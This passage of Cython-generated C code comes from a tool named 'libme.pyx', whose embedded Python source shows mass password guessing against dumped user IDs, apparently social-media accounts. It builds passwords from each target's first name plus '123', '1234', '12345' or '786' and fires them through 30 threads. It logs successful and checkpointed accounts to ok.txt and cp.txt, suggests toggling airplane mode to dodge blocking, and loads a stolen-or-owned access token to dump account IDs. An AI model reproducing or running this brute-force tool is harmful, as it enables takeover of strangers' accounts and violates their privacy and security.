                __pyx_t_4 = 0;
                __pyx_t_9 = 0;
                __pyx_t_6 = 0;
                __pyx_t_10 = 0;
                __Pyx_XDECREF_SET(__pyx_v_pwx, ((PyObject*)__pyx_t_17));
                __pyx_t_17 = 0;

                /* "libme.pyx":694
 * 						if len(ft)>=6:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:             # <<<<<<<<<<<<<<
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						else:
 */
                goto __pyx_L47;
              }

              /* "libme.pyx":697
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						else:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]             # <<<<<<<<<<<<<<
 * 						coeg.submit(self.__file__, uid, pwx)
 * 	def __ma__sal2__(self):
 */
              /*else*/ {
                __pyx_t_17 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_123); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 697, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_17);
                __pyx_t_10 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_1234); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 697, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_10);
                __pyx_t_6 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_12345); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 697, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_6);
                __pyx_t_9 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_786); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 697, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_9);
                __pyx_t_4 = PyList_New(5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 697, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_4);
                __Pyx_INCREF(__pyx_v_name);
                __Pyx_GIVEREF(__pyx_v_name);
                PyList_SET_ITEM(__pyx_t_4, 0, __pyx_v_name);
                __Pyx_GIVEREF(__pyx_t_17);
                PyList_SET_ITEM(__pyx_t_4, 1, __pyx_t_17);
                __Pyx_GIVEREF(__pyx_t_10);
                PyList_SET_ITEM(__pyx_t_4, 2, __pyx_t_10);
                __Pyx_GIVEREF(__pyx_t_6);
                PyList_SET_ITEM(__pyx_t_4, 3, __pyx_t_6);
                __Pyx_GIVEREF(__pyx_t_9);
                PyList_SET_ITEM(__pyx_t_4, 4, __pyx_t_9);
                __pyx_t_17 = 0;
                __pyx_t_10 = 0;
                __pyx_t_6 = 0;
                __pyx_t_9 = 0;
                __Pyx_XDECREF_SET(__pyx_v_pwx, ((PyObject*)__pyx_t_4));
                __pyx_t_4 = 0;
              }
              __pyx_L47:;

              /* "libme.pyx":698
 * 						else:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						coeg.submit(self.__file__, uid, pwx)             # <<<<<<<<<<<<<<
 * 	def __ma__sal2__(self):
 * 		try:
 */
              __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_v_coeg, __pyx_n_s_submit); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 698, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_9);
              __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_file); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 698, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_6);
              __pyx_t_10 = NULL;
              __pyx_t_12 = 0;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_9))) {
                __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_9);
                if (likely(__pyx_t_10)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
                  __Pyx_INCREF(__pyx_t_10);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_9, function);
                  __pyx_t_12 = 1;
                }
              }
              #if CYTHON_FAST_PYCALL
              if (PyFunction_Check(__pyx_t_9)) {
                PyObject *__pyx_temp[4] = {__pyx_t_10, __pyx_t_6, __pyx_v_uid, __pyx_v_pwx};
                __pyx_t_4 = __Pyx_PyFunction_FastCall(__pyx_t_9, __pyx_temp+1-__pyx_t_12, 3+__pyx_t_12); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 698, __pyx_L37_error)
                __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
                __Pyx_GOTREF(__pyx_t_4);
                __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
              } else
              #endif
              #if CYTHON_FAST_PYCCALL
              if (__Pyx_PyFastCFunction_Check(__pyx_t_9)) {
                PyObject *__pyx_temp[4] = {__pyx_t_10, __pyx_t_6, __pyx_v_uid, __pyx_v_pwx};
                __pyx_t_4 = __Pyx_PyCFunction_FastCall(__pyx_t_9, __pyx_temp+1-__pyx_t_12, 3+__pyx_t_12); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 698, __pyx_L37_error)
                __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
                __Pyx_GOTREF(__pyx_t_4);
                __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
              } else
              #endif
              {
                __pyx_t_17 = PyTuple_New(3+__pyx_t_12); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 698, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_17);
                if (__pyx_t_10) {
                  __Pyx_GIVEREF(__pyx_t_10); PyTuple_SET_ITEM(__pyx_t_17, 0, __pyx_t_10); __pyx_t_10 = NULL;
                }
                __Pyx_GIVEREF(__pyx_t_6);
                PyTuple_SET_ITEM(__pyx_t_17, 0+__pyx_t_12, __pyx_t_6);
                __Pyx_INCREF(__pyx_v_uid);
                __Pyx_GIVEREF(__pyx_v_uid);
                PyTuple_SET_ITEM(__pyx_t_17, 1+__pyx_t_12, __pyx_v_uid);
                __Pyx_INCREF(__pyx_v_pwx);
                __Pyx_GIVEREF(__pyx_v_pwx);
                PyTuple_SET_ITEM(__pyx_t_17, 2+__pyx_t_12, __pyx_v_pwx);
                __pyx_t_6 = 0;
                __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_t_17, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 698, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_4);
                __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
              }
              __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
              __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

              /* "libme.pyx":689
 * 					print("  [] Cp result saved in > cp.txt")
 * 					print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 * 					for user in self.id:             # <<<<<<<<<<<<<<
 * 						uid, name = user.split("|")
 * 						ft = name.split(" ")[0]
 */
            }
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

            /* "libme.pyx":685
 * 					coeg.submit(self.__file__,uid, listpass.split(","))
 * 		elif ask == "t":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:             # <<<<<<<<<<<<<<
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 					print("  [] Cp result saved in > cp.txt")
 */
          }
          __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
          goto __pyx_L42_try_end;
          __pyx_L37_error:;
          __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
          __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
          __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
          /*except:*/ {
            __Pyx_AddTraceback("libme.James.__10000__", __pyx_clineno, __pyx_lineno, __pyx_filename);
            if (__Pyx_GetException(&__pyx_t_5, &__pyx_t_4, &__pyx_t_9) < 0) __PYX_ERR(0, 685, __pyx_L39_except_error)
            __Pyx_GOTREF(__pyx_t_5);
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_GOTREF(__pyx_t_9);
            __pyx_t_17 = PyTuple_Pack(3, __pyx_t_5, __pyx_t_4, __pyx_t_9); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 685, __pyx_L39_except_error)
            __Pyx_GOTREF(__pyx_t_17);
            __pyx_t_18 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_t_17, NULL);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
            if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 685, __pyx_L39_except_error)
            __Pyx_GOTREF(__pyx_t_18);
            __pyx_t_19 = __Pyx_PyObject_IsTrue(__pyx_t_18);
            __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
            if (__pyx_t_19 < 0) __PYX_ERR(0, 685, __pyx_L39_except_error)
            __pyx_t_13 = ((!(__pyx_t_19 != 0)) != 0);
            if (__pyx_t_13) {
              __Pyx_GIVEREF(__pyx_t_5);
              __Pyx_GIVEREF(__pyx_t_4);
              __Pyx_XGIVEREF(__pyx_t_9);
              __Pyx_ErrRestoreWithState(__pyx_t_5, __pyx_t_4, __pyx_t_9);
              __pyx_t_5 = 0; __pyx_t_4 = 0; __pyx_t_9 = 0; 
              __PYX_ERR(0, 685, __pyx_L39_except_error)
            }
            __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
            __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
            __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
            goto __pyx_L38_exception_handled;
          }
          __pyx_L39_except_error:;
          __Pyx_XGIVEREF(__pyx_t_14);
          __Pyx_XGIVEREF(__pyx_t_1);
          __Pyx_XGIVEREF(__pyx_t_2);
          __Pyx_ExceptionReset(__pyx_t_14, __pyx_t_1, __pyx_t_2);
          goto __pyx_L1_error;
          __pyx_L38_exception_handled:;
          __Pyx_XGIVEREF(__pyx_t_14);
          __Pyx_XGIVEREF(__pyx_t_1);
          __Pyx_XGIVEREF(__pyx_t_2);
          __Pyx_ExceptionReset(__pyx_t_14, __pyx_t_1, __pyx_t_2);
          __pyx_L42_try_end:;
        }
      }
      /*finally:*/ {
        /*normal exit:*/{
          if (__pyx_t_3) {
            __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__13, NULL);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 685, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_2);
            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
          }
          goto __pyx_L36;
        }
        __pyx_L36:;
      }
      goto __pyx_L54;
      __pyx_L33_error:;
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      goto __pyx_L1_error;
      __pyx_L54:;
    }

    /* "libme.pyx":684
 * 					uid, name = user.split("|")
 * 					coeg.submit(self.__file__,uid, listpass.split(","))
 * 		elif ask == "t":             # <<<<<<<<<<<<<<
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 */
  }
  __pyx_L13:;

  /* "libme.pyx":662
 * 		print("  [] Total id > \033[0;92m%s\033[0;97m"%(len(__id)))
 * 		print("  [] Extra Dump Files Saved In > %s"%(__file))
 * 	def __10000__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			file = '/storage/emulated/0/100.txt'
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_9);
  __Pyx_XDECREF(__pyx_t_10);
  __Pyx_XDECREF(__pyx_t_16);
  __Pyx_XDECREF(__pyx_t_17);
  __Pyx_AddTraceback("libme.James.__10000__", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_file);
  __Pyx_XDECREF(__pyx_v_line);
  __Pyx_XDECREF(__pyx_v_ask);
  __Pyx_XDECREF(__pyx_v_coeg);
  __Pyx_XDECREF(__pyx_v_listpass);
  __Pyx_XDECREF(__pyx_v_user);
  __Pyx_XDECREF(__pyx_v_uid);
  __Pyx_XDECREF(__pyx_v_name);
  __Pyx_XDECREF(__pyx_v_ft);
  __Pyx_XDECREF(__pyx_v_pwx);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "libme.pyx":699
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						coeg.submit(self.__file__, uid, pwx)
 * 	def __ma__sal2__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			token=open('login.txt', 'r').read()
 */

/* Python wrapper */
static PyObject *__pyx_pw_5libme_5James_45__ma__sal2__(PyObject *__pyx_self, PyObject *__pyx_v_self); /*proto*/
static PyMethodDef __pyx_mdef_5libme_5James_45__ma__sal2__ = {"__ma__sal2__", (PyCFunction)__pyx_pw_5libme_5James_45__ma__sal2__, METH_O, 0};
static PyObject *__pyx_pw_5libme_5James_45__ma__sal2__(PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__ma__sal2__ (wrapper)", 0);
  __pyx_r = __pyx_pf_5libme_5James_44__ma__sal2__(__pyx_self, ((PyObject *)__pyx_v_self));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5libme_5James_44__ma__sal2__(CYTHON_UNUSED PyObject *__pyx_self, CYTHON_UNUSED PyObject *__pyx_v_self) {
  PyObject *__pyx_v_token = NULL;
  PyObject *__pyx_v___total = NULL;
  PyObject *__pyx_v______ = NULL;
  PyObject *__pyx_v_zx = NULL;
  PyObject *__pyx_v___ids = NULL;
  PyObject *__pyx_v_rex = NULL;
  PyObject *__pyx_v_ex = NULL;
  PyObject *__pyx_v_file = NULL;
  PyObject *__pyx_v_id = NULL;
  PyObject *__pyx_v_a = NULL;
  PyObject *__pyx_v___id = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  int __pyx_t_7;
  PyObject *__pyx_t_8 = NULL;
  Py_ssize_t __pyx_t_9;
  PyObject *(*__pyx_t_10)(PyObject *);
  PyObject *__pyx_t_11 = NULL;
  Py_ssize_t __pyx_t_12;
  PyObject *(*__pyx_t_13)(PyObject *);
  int __pyx_t_14;
  PyObject *__pyx_t_15 = NULL;
  PyObject *__pyx_t_16 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("__ma__sal2__", 0);

  /* "libme.pyx":700
 * 						coeg.submit(self.__file__, uid, pwx)
 * 	def __ma__sal2__(self):
 * 		try:             # <<<<<<<<<<<<<<
 * 			token=open('login.txt', 'r').read()
 * 		except(KeyError , IOError):
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_3);
    /*try:*/ {

      /* "libme.pyx":701
 * 	def __ma__sal2__(self):
 * 		try:
 * 			token=open('login.txt', 'r').read()             # <<<<<<<<<<<<<<
 * 		except(KeyError , IOError):
 * 			exit("  [!] Token invalid")
 */
      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__27, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 701, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_read); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 701, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_5)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
          __Pyx_INCREF(__pyx_t_5);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_6, function);
        }
      }
      __pyx_t_4 = (__pyx_t_5) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_5) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 701, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_v_token = __pyx_t_4;
      __pyx_t_4 = 0;

      /* "libme.pyx":700
 * 						coeg.submit(self.__file__, uid, pwx)
 * 	def __ma__sal2__(self):
 * 		try:             # <<<<<<<<<<<<<<
 * 			token=open('login.txt', 'r').read()
 * 		except(KeyError , IOError):
 */
    }
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;

    /* "libme.pyx":702
 * 		try:
 * 			token=open('login.txt', 'r').read()
 * 		except(KeyError , IOError):             # <<<<<<<<<<<<<<
 * 			exit("  [!] Token invalid")
 * 		try:
 */
    __pyx_t_7 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_KeyError) || __Pyx_PyErr_ExceptionMatches(__pyx_builtin_IOError);
    if (__pyx_t_7) {
      __Pyx_AddTraceback("libme.James.__ma__sal2__", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_4, &__pyx_t_6, &__pyx_t_5) < 0) __PYX_ERR(0, 702, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_GOTREF(__pyx_t_5);

      /* "libme.pyx":703
 * 			token=open('login.txt', 'r').read()
 * 		except(KeyError , IOError):
 * 			exit("  [!] Token invalid")             # <<<<<<<<<<<<<<
 * 		try:
 * 			__total = int(input("\n  [!] How Much Account U Want Dump : "))
 */
      __pyx_t_8 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__34, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 703, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;
    __pyx_L5_except_error:;

    /* "libme.pyx":700
 * 						coeg.submit(self.__file__, uid, pwx)
 * 	def __ma__sal2__(self):
 * 		try:             # <<<<<<<<<<<<<<
 * 			token=open('login.txt', 'r').read()
 * 		except(KeyError , IOError):
 */
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    __pyx_L8_try_end:;
  }

  /* "libme.pyx":704
 * 		except(KeyError , IOError):
 * 			exit("  [!] Token invalid")
 * 		try:             # <<<<<<<<<<<<<<
 * 			__total = int(input("\n  [!] How Much Account U Want Dump : "))
 * 		except:
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_3, &__pyx_t_2, &__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_1);
    /*try:*/ {

      /* "libme.pyx":705
 * 			exit("  [!] Token invalid")
 * 		try:
 * 			__total = int(input("\n  [!] How Much Account U Want Dump : "))             # <<<<<<<<<<<<<<
 * 		except:
 * 			__total = 1
 */
      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__49, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 705, __pyx_L11_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_6 = __Pyx_PyNumber_Int(__pyx_t_5); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 705, __pyx_L11_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_v___total = __pyx_t_6;
      __pyx_t_6 = 0;

      /* "libme.pyx":704
 * 		except(KeyError , IOError):
 * 			exit("  [!] Token invalid")
 * 		try:             # <<<<<<<<<<<<<<
 * 			__total = int(input("\n  [!] How Much Account U Want Dump : "))
 * 		except:
 */
    }
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    goto __pyx_L16_try_end;
    __pyx_L11_error:;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;

    /* "libme.pyx":706
 * 		try:
 * 			__total = int(input("\n  [!] How Much Account U Want Dump : "))
 * 		except:             # <<<<<<<<<<<<<<
 * 			__total = 1
 * 		os.system("rm -rf /sdcard/f_2.txt")
 */
    /*except:*/ {
      __Pyx_AddTraceback("libme.James.__ma__sal2__", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_6, &__pyx_t_5, &__pyx_t_4) < 0) __PYX_ERR(0, 706, __pyx_L13_except_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_GOTREF(__pyx_t_4);

      /* "libme.pyx":707
 * 			__total = int(input("\n  [!] How Much Account U Want Dump : "))
 * 		except:
 * 			__total = 1             # <<<<<<<<<<<<<<
 * 		os.system("rm -rf /sdcard/f_2.txt")
 * 		_____ = ("/sdcard/f_2.txt")
 */
      __Pyx_INCREF(__pyx_int_1);
      __Pyx_XDECREF_SET(__pyx_v___total, __pyx_int_1);
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      goto __pyx_L12_exception_handled;
    }
    __pyx_L13_except_error:;

    /* "libme.pyx":704
 * 		except(KeyError , IOError):
 * 			exit("  [!] Token invalid")
 * 		try:             # <<<<<<<<<<<<<<
 * 			__total = int(input("\n  [!] How Much Account U Want Dump : "))
 * 		except:
 */
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_2, __pyx_t_1);
    goto __pyx_L1_error;
    __pyx_L12_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_2, __pyx_t_1);
    __pyx_L16_try_end:;
  }

  /* "libme.pyx":708
 * 		except:
 * 			__total = 1
 * 		os.system("rm -rf /sdcard/f_2.txt")             # <<<<<<<<<<<<<<
 * 		_____ = ("/sdcard/f_2.txt")
 * 		for zx in range(__total):
 */
  __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_os); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 708, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_system); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 708, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_t_5 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
    __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
    if (likely(__pyx_t_5)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
      __Pyx_INCREF(__pyx_t_5);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_6, function);
    }
  }
  __pyx_t_4 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_5, __pyx_kp_s_rm_rf_sdcard_f_2_txt) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_kp_s_rm_rf_sdcard_f_2_txt);
  __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
  if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 708, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

  /* "libme.pyx":709
 * 			__total = 1
 * 		os.system("rm -rf /sdcard/f_2.txt")
 * 		_____ = ("/sdcard/f_2.txt")             # <<<<<<<<<<<<<<
 * 		for zx in range(__total):
 * 			zx += 1
 */
  __Pyx_INCREF(__pyx_kp_s_sdcard_f_2_txt);
  __pyx_v______ = __pyx_kp_s_sdcard_f_2_txt;

  /* "libme.pyx":710
 * 		os.system("rm -rf /sdcard/f_2.txt")
 * 		_____ = ("/sdcard/f_2.txt")
 * 		for zx in range(__total):             # <<<<<<<<<<<<<<
 * 			zx += 1
 * 			__ids=input("  [+] Enter User ID : ")
 */
  __pyx_t_4 = __Pyx_PyObject_CallOneArg(__pyx_builtin_range, __pyx_v___total); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 710, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  if (likely(PyList_CheckExact(__pyx_t_4)) || PyTuple_CheckExact(__pyx_t_4)) {
    __pyx_t_6 = __pyx_t_4; __Pyx_INCREF(__pyx_t_6); __pyx_t_9 = 0;
    __pyx_t_10 = NULL;
  } else {
    __pyx_t_9 = -1; __pyx_t_6 = PyObject_GetIter(__pyx_t_4); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 710, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __pyx_t_10 = Py_TYPE(__pyx_t_6)->tp_iternext; if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 710, __pyx_L1_error)
  }
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  for (;;) {
    if (likely(!__pyx_t_10)) {
      if (likely(PyList_CheckExact(__pyx_t_6))) {
        if (__pyx_t_9 >= PyList_GET_SIZE(__pyx_t_6)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_4 = PyList_GET_ITEM(__pyx_t_6, __pyx_t_9); __Pyx_INCREF(__pyx_t_4); __pyx_t_9++; if (unlikely(0 < 0)) __PYX_ERR(0, 710, __pyx_L1_error)
        #else
        __pyx_t_4 = PySequence_ITEM(__pyx_t_6, __pyx_t_9); __pyx_t_9++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 710, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_4);
        #endif
      } else {
        if (__pyx_t_9 >= PyTuple_GET_SIZE(__pyx_t_6)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
